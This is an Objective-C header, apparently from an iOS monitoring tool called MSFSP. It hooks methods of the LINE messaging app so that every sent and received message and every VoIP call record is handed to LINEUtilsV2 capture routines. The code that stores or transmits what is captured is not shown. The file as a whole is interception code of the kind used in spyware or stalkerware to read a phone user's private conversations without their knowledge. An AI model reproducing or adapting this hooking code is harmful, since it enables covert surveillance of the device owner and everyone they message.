//
//  LINE5.h
//  MSFSP
//
//  Created by Makara Khloth on 8/20/15.
//
//

#import "MSFSP.h"
#import "LINEUtilsV2.h"

#import "ManagedMessage.h"
#import "ManagedChat.h"

#pragma mark - Only Outgoing VOIP -

HOOK(ManagedMessage, line_messageSent$, void, id sent) {
    DLog (@"----------------------------------------------------------------------------------------");
    DLog (@">>>>>>>>>>>>>>>>>>>>> ManagedMessage --> line_messageSent, %@", sent);
    DLog (@"----------------------------------------------------------------------------------------");
    
    CALL_ORIG(ManagedMessage, line_messageSent$, sent);
    
    if ([self contentType] == kLINEContentTypeCall) {
        id chat = [self performSelector:@selector(primitiveChat)];
        DLog(@"chat, [%@] %@", [chat class], chat);
        
        [LINEUtilsV2 captureLINEVoIP:sent chat:chat outgoing:YES];
    }
}

#pragma mark - Outgoing -

HOOK(ManagedMessage, send, void) {
    DLog (@"------------------------------------------------------------------");
    DLog (@">>>>>>>>>>>>>>>>>>>>> ManagedMessage --> send");
    DLog (@"------------------------------------------------------------------");
    
    CALL_ORIG(ManagedMessage, send);
    
    id chat = [self performSelector:@selector(primitiveChat)];
    DLog(@"chat, [%@] %@", [chat class], chat);
    
    [LINEUtilsV2 captureLINEMessage:self chat:chat outgoing:YES];
}

HOOK(ManagedMessage, sendWithCompletionHandler$, void, id arg1) {
    DLog (@"------------------------------------------------------------------");
    DLog (@">>>>>>>>>>>>>>>>>>>>> ManagedMessage --> sendWithCompletionHandler$, %@", arg1);
    DLog (@"------------------------------------------------------------------");
    
    CALL_ORIG(ManagedMessage, sendWithCompletionHandler$, arg1);
    
    id chat = [self performSelector:@selector(primitiveChat)];
    DLog(@"chat, [%@] %@", [chat class], chat);
    
    [LINEUtilsV2 captureLINEMessage:self chat:chat outgoing:YES];
}

#pragma mark - Incoming -

HOOK(ManagedChat, updateLastReceivedMessageID$, void, id aMsgObj) {
    DLog (@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
    DLog (@">>>>>>>>>>>>>>>>>>>>> ManagedChat --> updateLastReceivedMessageID, %@", aMsgObj);
    DLog (@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
    
    CALL_ORIG(ManagedChat, updateLastReceivedMessageID$, aMsgObj);
    
    if ([(ManagedMessage *)aMsgObj contentType] == kLINEContentTypeCall) {
        [LINEUtilsV2 captureLINEVoIP:aMsgObj chat:self outgoing:NO];
    } else {
        [LINEUtilsV2 captureLINEMessage:aMsgObj chat:self outgoing:NO];
    }
}